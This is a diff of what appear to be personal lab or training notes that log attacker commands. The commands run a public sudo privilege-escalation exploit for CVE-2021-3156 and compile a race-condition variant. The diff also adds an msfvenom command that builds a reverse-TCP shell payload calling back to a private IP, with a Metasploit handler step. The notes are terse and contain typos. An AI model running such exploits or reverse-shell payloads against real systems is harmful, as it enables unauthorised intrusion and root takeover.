@@ -90,11 +90,16 @@ up on a webpage and the downloading it from victim.
 (ATTACKER) file main
 (ATTACKER) unzip main
 (ATTACKER) ls
-(ATTACKER)cd CVE-2021-3156-main
+(ATTACKER) cd CVE-2021-3156-main
 (ATTACKER) cat readme [2:11][DAY 12]
 (ATTACKER) python3 exploit_nss.py
 (ATTACKER) gcc -o exploit_timestamp_race exploit_timestamp_race.c [2:12:27]
 
+[3:36]
+
+(ATTACKER) msfvenom-p linux/x64/shell/reverse_tcp LHOST=192.168.122.209 LPORT=61775 -f elf -o mal
+open mfsconsole
+search multi handler
 
 
 [[[[[[SKIP!!! THIS. TO HARD STOP, RABBIT HOLE]]]]]]
